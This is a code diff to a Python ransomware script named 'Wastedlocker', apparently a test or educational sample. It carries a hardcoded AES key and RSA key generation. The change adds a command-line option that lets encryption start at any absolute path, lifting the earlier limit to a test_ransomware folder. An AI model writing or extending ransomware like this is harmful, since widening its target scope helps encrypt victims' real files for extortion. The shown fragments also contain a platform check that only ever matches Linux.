@@ -21,6 +21,7 @@ HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn' # AES 256-key
 
 def get_parser():
     parser = argparse.ArgumentParser(description='Wastedlocker')
+    parser.add_argument('-p', '--path', help='Absolute path to start encryption. If none specified, defaults to %HOME%/test_ransomware [default: no]', action="store", dest="path")
     parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                         action="store_true")
     return parser
@@ -29,6 +30,7 @@ def main():
     parser  = get_parser()
     args    = vars(parser.parse_args())
     decrypt = args['decrypt']
+    absolute_path = args['path']
     rsa_gen = RSA.generate(2048)
     publickey = rsa_gen.publickey()  
 
@@ -65,9 +67,15 @@ def main():
 
     plt = platform.system()
     if plt == ("Linux" or "Darwin"):
-        startdirs = [os.environ['HOME'] + '/test_ransomware']
+        if absolute_path:
+            startdirs = [absolute_path]
+        else:
+            startdirs = [os.environ['HOME'] + '/test_ransomware']
     elif plt == "Windows":
-        startdirs = [os.environ['USERPROFILE'] + '\\desktop\\test_ransomware']
+        if absolute_path:
+            startdirs = [absolute_path]
+        else:
+            startdirs = [os.environ['USERPROFILE'] + '\\desktop\\test_ransomware']
     else:
         print("Unidentified system")
         exit()
